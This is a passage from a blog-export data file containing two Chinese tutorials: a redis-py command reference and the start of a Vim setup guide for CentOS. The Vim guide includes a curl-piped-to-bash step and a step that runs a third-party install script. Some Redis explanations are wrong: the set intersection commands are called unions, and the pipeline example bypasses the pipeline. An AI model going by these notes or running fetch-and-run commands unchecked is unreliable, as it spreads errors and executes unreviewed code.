src=\"https://images2015.cnblogs.com/blog/425762/201602/425762-20160223115506630-113443460.png\" width=\"345\"></p>\n\n<p> </p>\n\n<p><strong>hset(name, key, value)</strong></p>\n\n<p> </p>\n\n<pre>\n# name对应的hash中设置一个键值对（不存在，则创建；否则，修改）\n \n# 参数：\n    # name，redis的name\n    # key，name对应的hash中的key\n    # value，name对应的hash中的value\n \n# 注：\n    # hsetnx(name, key, value),当name对应的hash中不存在当前key时则创建（相当于添加）\n\nr.hset(\"h1\", \"name\", \"koka\")\n1\nr.hget(\"h1\", \"name\")\nb'koka'</pre>\n\n<p> </p>\n\n<p><strong>hmset(name, mapping)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的hash中批量设置键值对\n \n# 参数：\n    # name，redis的name\n    # mapping，字典，如：{'k1':'v1', 'k2': 'v2'}\n \n# 如：\n    # r.hmset('xx', {'k1':'v1', 'k2': 'v2'})\n\nr.hmset('n1', {'k1': 'v1', 'k2': 'v2'})\nr.hmget(\"n1\", \"k1\", \"k2\")\n[b'v1', b'v2']</pre>\n\n<p><strong>hgetall(name)</strong></p>\n\n<pre>\n# 获取name对应hash的所有键值\nr.hgetall(\"n1\")\n{b'k2': b'v2', b'k1': b'v1'}</pre>\n\n<p><strong>hlen(name)</strong></p>\n\n<pre>\n# 获取name对应的hash中键值对的个数\nr.hlen(\"n1\")\n2</pre>\n\n<p><strong>hkeys(name)</strong></p>\n\n<pre>\n# 获取name对应的hash中所有的key的值\nr.hkeys(\"n1\")\n[b'k2', b'k1']</pre>\n\n<p><strong>hvals(name)</strong></p>\n\n<pre>\n# 获取name对应的hash中所有的value的值\nr.hvals(\"n1\")\n[b'v2', b'v1']</pre>\n\n<p><strong>hexists(name, key)</strong></p>\n\n<pre>\n# 检查name对应的hash是否存在当前传入的key\nr.hexists(\"n1\", \"k1\")</pre>\n\n<p><strong>hdel(name,*keys)</strong></p>\n\n<pre>\n# 将name对应的hash中指定key的键值对删除\nr.hdel(\"n1\", \"k1\")\n1</pre>\n\n<p><strong>hincrby(name, key, amount=1)</strong></p>\n\n<pre>\n# 自增name对应的hash中的指定key的值，不存在则创建key=amount\n# 参数：\n    # name，redis中的name\n    # key， hash对应的key\n    # amount，自增数（整数）\n\nr.hincrby(\"n1\", \"k1\", 1)\n1</pre>\n\n<p> </p>\n\n<p><strong>hincrbyfloat(name, key, amount=1.0)</strong></p>\n\n<p> </p>\n\n<pre>\n# 自增name对应的hash中的指定key的值，不存在则创建key=amount\n \n# 参数：\n    # name，redis中的name\n    # key， hash对应的key\n    # amount，自增数（浮点数）\n \n# 自增name对应的hash中的指定key的值，不存在则创建key=amount\n\nr.hincrbyfloat(\"n1\", \"k1\", 1)\n2.0</pre>\n\n<p> </p>\n\n<p><strong>hscan(name, cursor=0, match=None, count=None)</strong></p>\n\n<p> </p>\n\n<pre>\n# 增量式迭代获取，对于数据大的数据非常有用，hscan可以实现分片的获取数据，并非一次性将数据全部获取完，从而放置内存被撑爆\n \n# 参数：\n    # name，redis的name\n    # cursor，游标（基于游标分批取获取数据）\n    # match，匹配指定key，默认None 表示所有的key\n    # count，每次分片最少获取个数，默认None表示采用Redis的默认分片个数\n \n# 如：\n    # 第一次：cursor1, data1 = r.hscan('xx', cursor=0, match=None, count=None)\n    # 第二次：cursor2, data1 = r.hscan('xx', cursor=cursor1, match=None, count=None)\n    # ...\n    # 直到返回值cursor的值为0时，表示数据已经通过分片获取完毕\n\nr.hscan(\"n1\")\n(0, {b'k2': b'v2', b'k1': b'3'})</pre>\n\n<p> </p>\n\n<p><strong>hscan_iter(name, match=None, count=None)</strong></p>\n\n<p> </p>\n\n<pre>\n# 利用yield封装hscan创建生成器，实现分批去redis中获取数据\n \n# 参数：\n    # match，匹配指定key，默认None 表示所有的key\n    # count，每次分片最少获取个数，默认None表示采用Redis的默认分片个数\n \nfor i in r.hscan_iter(\"n1\", match=None, count=None):print(i)\n(b'k2', b'v2')\n(b'k1', b'3')</pre>\n\n<p> </p>\n\n<p>List操作，redis中的List在在内存中按照一个name对应一个List来存储。如图：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"177\" src=\"https://images2015.cnblogs.com/blog/425762/201602/425762-20160223172249115-189393001.png\" width=\"280\"></p>\n\n<p> </p>\n\n<p><strong>lpush(name,values)</strong><a><img alt=\"复制代码\" class=\"has\" src=\"https://common.cnblogs.com/images/copycode.gif\"></a></p>\n\n<pre>\n# 在name对应的list中添加元素，每个新的元素都添加到列表的最左边\n \n# 如：\n    # r.lpush('oo', 11,22,33)\n    # 保存顺序为: 33,22,11\n \n# 扩展：\n    # rpush(name, values) 表示从右向左操作\n\nr.lpush(\"l1\", [11, 22, 33, 44])\n1\nr.lpush(\"l1\", [11, 22, 33, 44])\n2\nr.lrange(\"l1\", '0', '3')\n[b'[11, 22, 33, 44]', b'[11, 22, 33, 44]']\n\nr.lpush(\"l3\", \"AA\", \"BB\", \"CC\", \"DD\")\n1\nr.lrange(\"l3\",0,2)\n[b'CC', b'BB', b'AA']</pre>\n\n<p> </p>\n\n<p><strong>lpushx(name,value)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的list中添加元素，只有name已经存在时，值添加到列表的最左边\n \n# 更多：\n    # rpushx(name, value) 表示从右向左操作\n\nr.lpushx(\"l2\", \"33\")\n0\nr.lrange(\"l2\",0,1)\n[]</pre>\n\n<p> </p>\n\n<p><strong>llen(name)</strong></p>\n\n<pre>\n# name对应的list元素的个数\nr.llen(\"l1\")\n2</pre>\n\n<p><strong>linsert(name, where, refvalue, value))</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的列表的某一个值前或后插入一个新值\n \n# 参数：\n    # name，redis的name\n    # where，BEFORE或AFTER\n    # refvalue，标杆值，即：在它前后插入数据\n    # value，要插入的数据\n\nr.lpush(\"l3\", \"AA\", \"BB\", \"CC\", \"DD\")\nr.lrange(\"l3\", 0, 2)\n[b'CC', b'BB', b'AA']\n\nr.linsert(\"l3\", \"AFTER\", \"CC\", \"cc\")\nr.lrange(\"l3\", 0, 3)\n[b'CC', b'cc', b'BB', b'AA']</pre>\n\n<p> </p>\n\n<p><strong>r.lset(name, index, value)</strong></p>\n\n<p> </p>\n\n<pre>\n# 对name对应的list中的某一个索引位置重新赋值\n \n# 参数：\n    # name，redis的name\n    # index，list的索引位置\n    # value，要设置的值\n\nr.lset(\"l3\", '2', 'Cc')\nr.lrange(\"l3\", '0', '5')\n[b'DD', b'CC', b'Cc', b'BB', b'AA']</pre>\n\n<p> </p>\n\n<p><strong>r.lrem(name, value, num)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的list中删除指定的值\n \n# 参数：\n    # name，redis的name\n    # value，要删除的值\n    # num，  num=0，删除列表中所有的指定值；\n           # num=2,从前到后，删除2个；\n           # num=-2,从后向前，删除2个\n\nr.lrem(\"l3\", 'Cc')\n1\nr.lrange(\"l3\", '0', '4')\n[b'DD', b'CC', b'BB', b'AA']</pre>\n\n<p> </p>\n\n<p><strong>lpop(name)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的列表的左侧获取第一个元素并在列表中移除，返回值则是第一个元素\n# 更多：\n    # rpop(name) 表示从右向左操作\nr.lpop(\"l3\")\nb'DD'\nr.lrange(\"l3\", '0', '2')\n[b'CC', b'BB', b'AA']</pre>\n\n<p> </p>\n\n<p><strong>ltrim(name, start, end)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在name对应的列表中移除没有在start-end索引之间的值\n# 参数：\n    # name，redis的name\n    # start，索引的起始位置\n    # end，索引结束位置\n\nr.ltrim(\"l3\", \"0\", \"1\")\nTrue\nr.lrange(\"l3\", '0', '3')\n[b'CC', b'BB']</pre>\n\n<p> </p>\n\n<p><strong>rpoplpush(src, dst)</strong></p>\n\n<p> </p>\n\n<pre>\n# 从一个列表取出最右边的元素，同时将其添加至另一个列表的最左边\n# 参数：\n    # src，要取数据的列表的name\n    # dst，要添加数据的列表的name\nr.lpush(\"l4\", '11', '22', '33')\nr.lpush(\"l5\", '44', '55', '66')\nr.rpoplpush(\"l4\", \"l5\")\nb'11'\nr.lrange(\"l4\", '0', '3')\n[b'33', b'22']\nr.lrange(\"l5\", '0', '3')\n[b'11', b'66', b'55', b'44']</pre>\n\n<p> </p>\n\n<p><strong>blpop(keys, timeout)</strong></p>\n\n<p> </p>\n\n<pre>\n# 将多个列表排列，按照从左到右去pop对应列表的元素\n \n# 参数：\n    # keys，redis的name的集合\n    # timeout，超时时间，当元素所有列表的元素获取完之后，阻塞等待列表内有数据的时间（秒）, 0 表示永远阻塞\n \n# 更多：\n    # r.brpop(keys, timeout)，从右向左获取数据\n\nr.blpop(\"l5\", timeout=1)\n(b'l5', b'11')\nr.lrange(\"l5\",0,3)\n[b'66', b'55', b'44']</pre>\n\n<p> </p>\n\n<p><strong>lindex(name, index)</strong></p>\n\n<pre>\n#在name对应的列表中根据索引获取列表元素\n&gt;&gt;&gt; r.lrange(\"l3\",0,3)\n[b'CC', b'cc', b'BB', b'AA']\n&gt;&gt;&gt; r.lindex(\"l3\",\"0\")\nb'CC'</pre>\n\n<p><strong>自定义增量迭代</strong></p>\n\n<p> </p>\n\n<pre>\n# 由于redis类库中没有提供对列表元素的增量迭代，如果想要循环name对应的列表的所有元素，那么就需要：\n    # 1、获取name对应的所有列表\n    # 2、循环列表\n# 但是，如果列表非常大，那么就有可能在第一步时就将程序的内容撑爆，所有有必要自定义一个增量迭代的功能：\n \ndef list_iter(name):\n    \"\"\"\n    自定义redis列表增量迭代\n    :param name: redis中的name，即：迭代name对应的列表\n    :return: yield 返回 列表元素\n    \"\"\"\n    list_count = r.llen(name)\n    for index in range(list_count):\n        yield r.lindex(name, index)\n \n# 使用\nfor item in list_iter('l3'):\n    print(item)</pre>\n\n<p> </p>\n\n<p><strong>Set操作，Set集合就是不允许重复的列表</strong></p>\n\n<p>sadd(name,values)</p>\n\n<pre>\n# name对应的集合中添加元素</pre>\n\n<p>scard(name)</p>\n\n<pre>\n# 获取name对应的集合中元素个数</pre>\n\n<p>sdiff(keys, *args)</p>\n\n<pre>\n# 在第一个name对应的集合中且不在其他name对应的集合的元素集合</pre>\n\n<p>sdiffstore(dest, keys, *args)</p>\n\n<pre>\n# 获取第一个name对应的集合中且不在其他name对应的集合，再将其新加入到dest对应的集合中</pre>\n\n<p>sinter(keys, *args)</p>\n\n<pre>\n# 获取多一个name对应集合的并集</pre>\n\n<p>sinterstore(dest, keys, *args)</p>\n\n<pre>\n# 获取多一个name对应集合的并集，再讲其加入到dest对应的集合中</pre>\n\n<p>sismember(name, value)</p>\n\n<pre>\n# 检查value是否是name对应的集合的成员</pre>\n\n<p>smembers(name)</p>\n\n<pre>\n# 获取name对应的集合的所有成员</pre>\n\n<p>smove(src, dst, value)</p>\n\n<pre>\n# 将某个成员从一个集合中移动到另外一个集合</pre>\n\n<p>spop(name)</p>\n\n<pre>\n# 从集合的右侧（尾部）移除一个成员，并将其返回</pre>\n\n<p>srandmember(name, numbers)</p>\n\n<pre>\n# 从name对应的集合中随机获取 numbers 个元素</pre>\n\n<p>srem(name, values)</p>\n\n<pre>\n# 在name对应的集合中删除某些值</pre>\n\n<p>sunion(keys, *args)</p>\n\n<pre>\n# 获取多一个name对应的集合的并集</pre>\n\n<p>sunionstore(dest,keys, *args)</p>\n\n<pre>\n# 获取多一个name对应的集合的并集，并将结果保存到dest对应的集合中</pre>\n\n<p>sscan(name, cursor=0, match=None, count=None)<br>\nsscan_iter(name, match=None, count=None)</p>\n\n<pre>\n# 同字符串的操作，用于增量迭代分批获取元素，避免内存消耗太大</pre>\n\n<p>有序集合，在集合的基础上，为每元素排序；元素的排序需要根据另外一个值来进行比较，所以，对于有序集合，每一个元素有两个值，即：值和分数，分数专门用来做排序。</p>\n\n<p>zadd(name, *args, **kwargs)</p>\n\n<pre>\n# 在name对应的有序集合中添加元素\n# 如：\n     # zadd('zz', 'n1', 1, 'n2', 2)\n     # 或\n     # zadd('zz', n1=11, n2=22)</pre>\n\n<p>zcard(name)</p>\n\n<pre>\n# 获取name对应的有序集合元素的数量</pre>\n\n<p>zcount(name, min, max)</p>\n\n<pre>\n# 获取name对应的有序集合中分数 在 [min,max] 之间的个数</pre>\n\n<p>zincrby(name, value, amount)</p>\n\n<pre>\n# 自增name对应的有序集合的 name 对应的分数</pre>\n\n<p>r.zrange( name, start, end, desc=False, withscores=False, score_cast_func=float)</p>\n\n<p> </p>\n\n<pre>\n# 按照索引范围获取name对应的有序集合的元素\n \n# 参数：\n    # name，redis的name\n    # start，有序集合索引起始位置（非分数）\n    # end，有序集合索引结束位置（非分数）\n    # desc，排序规则，默认按照分数从小到大排序\n    # withscores，是否获取元素的分数，默认只获取元素的值\n    # score_cast_func，对分数进行数据转换的函数\n \n# 更多：\n    # 从大到小排序\n    # zrevrange(name, start, end, withscores=False, score_cast_func=float)\n \n    # 按照分数范围获取name对应的有序集合的元素\n    # zrangebyscore(name, min, max, start=None, num=None, withscores=False, score_cast_func=float)\n    # 从大到小排序\n    # zrevrangebyscore(name, max, min, start=None, num=None, withscores=False, score_cast_func=float)</pre>\n\n<p> </p>\n\n<p>zrank(name, value)</p>\n\n<pre>\n# 获取某个值在 name对应的有序集合中的排行（从 0 开始）\n \n# 更多：\n    # zrevrank(name, value)，从大到小排序</pre>\n\n<p>zrangebylex(name, min, max, start=None, num=None)</p>\n\n<p> </p>\n\n<pre>\n# 当有序集合的所有成员都具有相同的分值时，有序集合的元素会根据成员的 值 （lexicographical ordering）来进行排序，而这个命令则可以返回给定的有序集合键 key 中， 元素的值介于 min 和 max 之间的成员\n# 对集合中的每个成员进行逐个字节的对比（byte-by-byte compare）， 并按照从低到高的顺序， 返回排序后的集合成员。 如果两个字符串有一部分内容是相同的话， 那么命令会认为较长的字符串比较短的字符串要大\n \n# 参数：\n    # name，redis的name\n    # min，左区间（值）。 + 表示正无限； - 表示负无限； ( 表示开区间； [ 则表示闭区间\n    # min，右区间（值）\n    # start，对结果进行分片处理，索引位置\n    # num，对结果进行分片处理，索引后面的num个元素\n \n# 如：\n    # ZADD myzset 0 aa 0 ba 0 ca 0 da 0 ea 0 fa 0 ga\n    # r.zrangebylex('myzset', \"-\", \"[ca\") 结果为：['aa', 'ba', 'ca']\n \n# 更多：\n    # 从大到小排序\n    # zrevrangebylex(name, max, min, start=None, num=None)</pre>\n\n<p> </p>\n\n<p>zrem(name, values)</p>\n\n<pre>\n# 删除name对应的有序集合中值是values的成员\n \n# 如：zrem('zz', ['s1', 's2'])</pre>\n\n<p>zremrangebyrank(name, min, max)</p>\n\n<pre>\n# 根据排行范围删除</pre>\n\n<p>zremrangebyscore(name, min, max)</p>\n\n<pre>\n# 根据分数范围删除</pre>\n\n<p>zremrangebylex(name, min, max)</p>\n\n<pre>\n# 根据值返回删除</pre>\n\n<p>zscore(name, value)</p>\n\n<pre>\n# 获取name对应有序集合中 value 对应的分数</pre>\n\n<p>zinterstore(dest, keys, aggregate=None)</p>\n\n<pre>\n# 获取两个有序集合的交集，如果遇到相同值不同分数，则按照aggregate进行操作\n# aggregate的值为:  SUM  MIN  MAX</pre>\n\n<p>zunionstore(dest, keys, aggregate=None)</p>\n\n<pre>\n# 获取两个有序集合的并集，如果遇到相同值不同分数，则按照aggregate进行操作\n# aggregate的值为:  SUM  MIN  MAX</pre>\n\n<p>zscan(name, cursor=0, match=None, count=None, score_cast_func=float)<br>\nzscan_iter(name, match=None, count=None,score_cast_func=float)</p>\n\n<pre>\n# 同字符串相似，相较于字符串新增score_cast_func，用来对分数进行操作</pre>\n\n<p>其他常用操作</p>\n\n<p>delete(*names)</p>\n\n<p> </p>\n\n<pre>\n# 根据删除redis中的任意数据类型\nr.set(\"test\",\"123\")\nr.get('test')\nb'123'\nr.delete(\"test\")\n1\nr.get(\"test\")\nNone</pre>\n\n<p> </p>\n\n<p>exists(name)</p>\n\n<p> </p>\n\n<pre>\n# 根据删除redis中的任意数据类型\nr.set(\"test\",\"123\")\nr.get('test')\nb'123'\nr.delete(\"test\")\n1\nr.exists(\"test\")\nFalse</pre>\n\n<p> </p>\n\n<p>keys(pattern='*')</p>\n\n<p> </p>\n\n<pre>\n# 根据模型获取redis的name\n \n# 更多：\n    # KEYS * 匹配数据库中所有 key 。\n    # KEYS h?llo 匹配 hello ， hallo 和 hxllo 等。\n    # KEYS h*llo 匹配 hllo 和 heeeeello 等。\n    # KEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hillo \n\nr.keys(pattern=\"*\")\n[b'l5', b'parter', b'name', b'l3', b'l4', b'foo']</pre>\n\n<p> </p>\n\n<p>expire(name ,time)</p>\n\n<pre>\n# 为某个redis的某个name设置超时时间\nr.set(\"t\",\"ok\")\nr.expire(\"t\",3)\nr.get(\"t\")  # 隔3秒后取值\nNone</pre>\n\n<p>rename(src, dst)</p>\n\n<pre>\n# 对redis的name重命名为\nr.set('rn','123')\nr.rename('rn','rename')\nr.get('rename')\nb'123'</pre>\n\n<p>move(name, db))</p>\n\n<pre>\n# 将redis的某个值移动到指定的db下</pre>\n\n<p>randomkey()</p>\n\n<pre>\n# 随机获取一个redis的name（不删除）</pre>\n\n<p>type(name)</p>\n\n<pre>\n# 获取name对应值的类型\nr.get(\"name\")\nb'jn'\nr.type(\"name\")\nb'string'</pre>\n\n<p>scan(cursor=0, match=None, count=None)<br>\nscan_iter(match=None, count=None)</p>\n\n<pre>\n# 同字符串操作，用于增量迭代获取key</pre>\n\n<p>4、管道</p>\n\n<p>redis-py默认在执行每次请求都会创建（连接池申请连接）和断开（归还连接池）一次连接操作，如果想要在一次请求中指定多个命令，则可以使用pipline实现一次请求指定多个命令，并且默认情况下一次pipline 是原子性操作。</p>\n\n<p> </p>\n\n<pre>\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nimport redis\n \npool = redis.ConnectionPool(host='10.211.55.4', port=6379)\n \nr = redis.Redis(connection_pool=pool)\n \n# pipe = r.pipeline(transaction=False)\npipe = r.pipeline(transaction=True)\n \nr.set('username', 'koka')\nr.set('passwd', '123')\n \npipe.execute()</pre>\n\n<p> </p>\n\n<p>5、发布订阅</p>\n\n<p><img alt=\"\" class=\"has\" height=\"273\" src=\"https://images2015.cnblogs.com/blog/425762/201601/425762-20160121152411125-1838441844.png\" width=\"467\"></p>\n\n<p>发布者：服务器</p>\n\n<p>订阅者：Dashboad和数据处理</p>\n\n<p>Demo如下：</p>\n\n<p><img alt=\"\" class=\"has\" id=\"code_img_closed_84b88e47-54f0-453d-844f-d98698ea89ff\" src=\"https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif\"> RedisHelper</p>\n\n<p>订阅者：</p>\n\n<p> </p>\n\n<pre>\n# !/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nfrom monitor.RedisHelper import RedisHelper\n \nobj = RedisHelper()\nredis_sub = obj.subscribe()\n \nwhile True:\n    msg= redis_sub.parse_response()\n    print(msg)</pre>\n\n<p> </p>\n\n<p>发布者：</p>\n\n<p> </p>\n\n<pre>\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nfrom monitor.RedisHelper import RedisHelper\n \nobj = RedisHelper()\nobj.public('hello')</pre>\n\n<p> </p>\n\n<p> sentinel</p>\n\n<p>redis中的sentinel主要用于在redis主从复制中，如果master故障，则自动将slave替换成master</p>\n\n<p> </p>\n\n<pre>\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nfrom redis.sentinel import Sentinel\n \n# 连接哨兵服务器(主机名也可以用域名)\nsentinel = Sentinel([('10.211.55.20', 26379),\n                     ('10.211.55.20', 26380),\n                     ],\n                    socket_timeout=0.5)\n \n# # 获取主服务器地址\n# master = sentinel.discover_master('mymaster')\n# print(master)\n#\n# # # 获取从服务器地址\n# slave = sentinel.discover_slaves('mymaster')\n# print(slave)\n#\n#\n# # # 获取主服务器进行写入\n# master = sentinel.master_for('mymaster')\n# master.set('foo', 'bar')\n \n \n \n# # # # 获取从服务器进行读取（默认是round-roubin）\n# slave = sentinel.slave_for('mymaster', password='redis_auth_pass')\n# r_ret = slave.get('foo')\n# print(r_ret)</pre>\n\n<p> </p>\n\n<p>更多参见：</p>\n\n<p>https://github.com/andymccurdy/redis-py/</p>\n\n<p>http://doc.redisfans.com/</p>\n\n<p>http://www.cnblogs.com/wupeiqi/articles/5132791.html</p>\n\n<p>转载原文:<a href=\"https://www.cnblogs.com/koka24/p/5841826.html\" rel=\"nofollow\">https://www.cnblogs.com/koka24/p/5841826.html</a></p>\n                                    </div>", "log_PostTime": 1584891115, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "VIM配置攻略（最强干货加强版）", "log_Intro": "VIM配置攻略（最强干货加强版）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>自己最近也在折腾这个VIM的配置，在网上也看了很多教程等，说真的看的一头雾水。主要是对于一个初学者来说对Vundle等根本没有什么了解，也不知道怎么用，并且由于本人的Linux系统是CentOs6.5的，所以版本也有限制，由于版本原因，竟然git都用不了！！！！这就很难受，所以费劲心思，找到了一篇对VIM配置比较详细的教程，只要按照的教程的步骤一步一步来，相信你也能配置一个十分满意的VIM，闲话不多说，进入正题。</p>\n\n<hr><h1 id=\"vim配置全攻略\"><a name=\"t0\"></a>vim配置全攻略</h1>\n\n<p>写在前面 <br>\n折腾有风险, 作死请谨慎.</p>\n\n<p>善用虚拟机的快照功能, 能够节省大把的时间.</p>\n\n<h2 id=\"vim低配版\"><a name=\"t1\"></a>vim低配版</h2>\n\n<h2 id=\"简介\"><a name=\"t2\"></a>简介</h2>\n\n<p>该份配置是基于我在2013年左右使用的一套配置, 改进而来. 当时使用的 vim 版本较低(7.0, redhat5), 因此该配置以兼容性为主. 插件功能一般. 安装过程简单.</p>\n\n<h2 id=\"折腾程度\"><a name=\"t3\"></a>折腾程度</h2>\n\n<p>安装过程: 2星</p>\n\n<h2 id=\"支持的系统\"><a name=\"t4\"></a>支持的系统</h2>\n\n<p>兼容 centos6.5 i686 和 x86_64, 兼容 centos7. vim版本 &gt;= 7.0 即可.</p>\n\n<h2 id=\"折腾-git1\"><a name=\"t5\"></a>折腾 git(1)</h2>\n\n<p>直接 yum install git 后, 发现 HTTP request failed 的问题.</p>\n\n<p>原因是由于 git 版本态度(1.7.1), 需要升级到高版本.</p>\n\n<p>由于 centos6.5无法通过yum源安装高版本git, 只好手动从源代码编译. 以下为安装步骤(以下步骤需要root权限):</p>\n\n<p>先安装编译时依赖的包</p>\n\n<pre class=\"has\">\n<code>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\nyum install  gcc perl-ExtUtils-MakeMaker</code></pre>\n\n<p>从该链接上下载源码, 并解压缩</p>\n\n<pre class=\"has\">\n<code>cd ~\nwget https://www.kernel.org/pub/software/scm/git/git-2.0.5.tar.gz\ntar xzf git-2.0.5.tar.gz</code></pre>\n\n<p>进入源码, 开始编译.</p>\n\n<pre class=\"has\">\n<code>cd git-2.0.5\nmake prefix=/usr/local/git all\nmake prefix=/usr/local/git install</code></pre>\n\n<p>下面这两步, 需要退出 root 用户再操作. 否则就只有root用户内部才生效了.</p>\n\n<pre class=\"has\">\n<code>echo \"export PATH=$PATH:/usr/local/git/bin\" &gt;&gt; /etc/bashrc\nsource /etc/bashrc</code></pre>\n\n<p>检查安装结果:</p>\n\n<pre class=\"has\">\n<code>git --version</code></pre>\n\n<p> </p>\n\n<p>观察版本号是否符合预期.</p>\n\n<p>安装过程参考 <a href=\"https://www.cnblogs.com/fuyuanming/p/5804695.html\" rel=\"nofollow\">https://www.cnblogs.com/fuyuanming/p/5804695.html</a></p>\n\n<h2 id=\"折腾-git2\"><a name=\"t6\"></a>折腾 git(2)</h2>\n\n<p>升级之后, 仍然出现问题:</p>\n\n<pre class=\"has\">\n<code>\nfatal: unable to access 'https://github.com/VundleVim/Vundle.vim.git/': SSL connect error\n\n</code></pre>\n\n<p>不能正确 clone 数据.</p>\n\n<p>需要再执行指令安装以下软件包</p>\n\n<pre class=\"has\">\n<code>yum update openssh nss curl libcurl</code></pre>\n\n<h2 id=\"vim配置\"><a name=\"t7\"></a>vim配置</h2>\n\n<p>由于 centos6.5 i686 对应的vim和gcc环境都比较老, 因此很多新的插件并不支持. 尤其是代表性的 YouCompleteMe 插件. 因此我们为了简单不折腾, 推荐了以下插件集合, 能够比较好的兼容旧版本的vim</p>\n\n<h2 id=\"插件集合\"><a name=\"t8\"></a>插件集合</h2>\n\n<p>auto-pairs.vim: 括号自动匹配 <br>\na.vim: 切换.h/.c文件 <br>\nDoxygenToolkit.vim: 生成文档风格的注释 <br>\nmark.vim: 高亮关键字 <br>\nNERD_tree.vim: 文件列表 <br>\ntagbar.vim: 函数列表 <br>\nctrlp.vim: 快速查找文件 <br>\ngruvbox: 一个漂亮的主题 <br>\npython-mode: 一组Python开发的工具集合 <br>\nvim-airline: 漂亮的标签页和状态栏 <br>\nvim-colorschemes: 一个主题集合包 <br>\nvim-cpp-enhanced-highlight: 更精细的c/c++语法高亮 <br>\nvim-surround: 快速给一段代码外面包裹括号/引号 <br>\nVundle.vim: vim的一个插件管理器 <br>\nAutoComlPop + OmniCppComplete + SuperTab + ctags: 代码补全 <br>\nctags: 代码跳转(这货不是vim插件, 是一个linux工具) <br>\nsyntastic: 语法检查 <br>\nsnipMate + vim-snippets: 代码片段</p>\n\n<p>这里还准备了一个快速安装脚本. 大家直接执行, 即可完成该vim插件集合的安装.</p>\n\n<h2 id=\"快速安装\"><a name=\"t9\"></a>快速安装</h2>\n\n<p>步骤一: 下载基础配置</p>\n\n<pre class=\"has\">\n<code>git clone https://gitee.com/HGtz2222/EasyVimConfig.git</code></pre>\n\n<p> </p>\n\n<p>步骤二: 执行安装脚本</p>\n\n<pre class=\"has\">\n<code>cd EasyVimConfig\nsh install.sh</code></pre>\n\n<p><img alt=\"这里写图片描述\" class=\"has\" src=\"https://img-blog.csdn.net/20180322131342622?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW54aWE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"><br>\n等待下载完毕后, 安装完成.(注意, 下载插件过程中界面是卡死的. 请耐心等待).</p>\n\n<h2 id=\"使用方法\"><a name=\"t10\"></a>使用方法</h2>\n\n<p>详细的使用方法, 可以参考 ~/.vimrc 中的注释内容</p>\n\n<h1 id=\"vim高配版1-spacevim\"><a name=\"t11\"></a>vim高配版(1) – SpaceVim</h1>\n\n<h2 id=\"简介-1\"><a name=\"t12\"></a>简介</h2>\n\n<p>SpaceVim 是国内的一个大佬将一些NB的插件整合到一起的一个插件包. 一键式安装, 功能强大.</p>\n\n<p>官网参见 <a href=\"https://spacevim.org/\" rel=\"nofollow\">https://spacevim.org/</a></p>\n\n<h2 id=\"折腾程度-1\"><a name=\"t13\"></a>折腾程度</h2>\n\n<p>安装过程: 3星</p>\n\n<h2 id=\"软件依赖\"><a name=\"t14\"></a>软件依赖</h2>\n\n<p>vim7.4+ 或 neovim 0.2.0 以上.</p>\n\n<p>centos7 默认 vim 版本为 7.4, 默认 gcc 版本为4.8, 比centos6.5好了不少. 但还是不够. 要想装一些新版的插件, 仍然需要升级 vim(甚至gcc)</p>\n\n<p>为了避免编译, 可以通过 yum 安装 neovim 以及 neovim 的 python 扩展来解决这个问题(centos7 x86_64 +</p>\n\n<p>下面介绍 centos7 x86_64 上安装 SpaceVim 的过程.</p>\n\n<h2 id=\"安装过程\"><a name=\"t15\"></a>安装过程</h2>\n\n<p>安装 neovim <br>\n先安装yum源的扩展</p>\n\n<pre class=\"has\">\n<code>yum -y install epel-release</code></pre>\n\n<p> </p>\n\n<p>然后安装 neovim</p>\n\n<pre class=\"has\">\n<code>yum install -y neovim.x86_64 python2-neovim.noarch</code></pre>\n\n<p> </p>\n\n<p>最后定义别名. 输入 vim 启动 neovim</p>\n\n<pre class=\"has\">\n<code># 修改 /etc/bashrc\nalias vim=\"nvim\"</code></pre>\n\n<p> </p>\n\n<p>然后重启终端后生效. 此时敲下 vim, 启动的实际是 nvim.</p>\n\n<h2 id=\"安装-git\"><a name=\"t16\"></a>安装 git</h2>\n\n<p>直接 yum install git 即可. 由于 centos7上的yum源git版本较高, 不需要涉及到前面的问题. 万一出现问题, 参考前方的解决方案.</p>\n\n<h2 id=\"安装-spacevim\"><a name=\"t17\"></a>安装 SpaceVim</h2>\n\n<p>下载安装基本配置</p>\n\n<pre class=\"has\">\n<code>curl -sLf https://spacevim.org/install.sh | bash</code></pre>\n\n<p> </p>\n\n<p>效果如图 <br><img alt=\"这里写图片描述\" class=\"has\" src=\"https://img-blog.csdn.net/2018032213272318?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW54aWE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"><br>\n下载安装插件.</p>\n\n<p>启动 vim, 等待插件下载完成. 由于插件数目较多, 因此下载时间也会很长. 万一下载中途出现界面卡死进度条下载缓慢的情况, 可以重启vim再次尝试下载. <br><img alt=\"这里写图片描述\" class=\"has\" src=\"https://img-blog.csdn.net/20180322132801561?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW54aWE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"><br>\n安装成功后, 打开会看到欢迎界面</p>\n\n<p>但是这时候如果是使用 xshell 连接的话, 可能会出现颜色不正确的情况. 可以参考下面的解决方法.</p>\n\n<h2 id=\"使用方法-1\"><a name=\"t18\"></a>使用方法</h2>\n\n<p>SpaceVim包含的插件体系非常丰富, 种类繁多. 因此在使用方面上作者有自己的一套设计体系. 具体可以参考官网文档.</p>\n\n<h2 